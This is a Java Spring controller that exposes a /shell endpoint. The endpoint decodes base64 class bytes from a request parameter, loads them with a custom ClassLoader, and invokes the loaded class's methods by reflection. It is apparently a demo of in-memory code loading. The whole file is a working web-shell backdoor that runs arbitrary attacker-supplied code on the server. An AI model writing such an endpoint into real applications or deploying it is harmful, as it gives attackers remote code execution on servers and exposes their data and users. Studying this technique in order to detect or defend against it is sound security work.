package com.sorry.jcoffe.Controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.lang.reflect.Method;

@Controller
public class ShellController {
    @RequestMapping("/shell")
    public void echo(HttpServletRequest req, HttpServletResponse rsp){
        try {
            PrintWriter writer = rsp.getWriter();
            String kk = req.getParameter("evilbyte64");
            byte[] evil =new sun.misc.BASE64Decoder().decodeBuffer(kk);
            Class evilClass = new customClassLoader().customDefineClass(evil);
            Object evilObj = evilClass.newInstance();

            Method method1 = evilObj.getClass().getDeclaredMethod("setName",String.class);
            Method method2 = evilObj.getClass().getDeclaredMethod("setAge",int.class);
            Method method3 = evilObj.getClass().getDeclaredMethod("getName");
            method1.setAccessible(true);
            method2.setAccessible(true);
            method3.setAccessible(true);
            method1.invoke(evilObj,"evil in request");
            method2.invoke(evilObj,1);
            String result = (String )method3.invoke(evilObj);

            writer.write(result);
            writer.flush();
            writer.close();




        }catch (Exception e){
            e.printStackTrace();
        }
    }


    class customClassLoader extends ClassLoader{
        public Class customDefineClass(byte[] evilbytes){
            return super.defineClass(evilbytes,0,evilbytes.length);
        }
    }

}
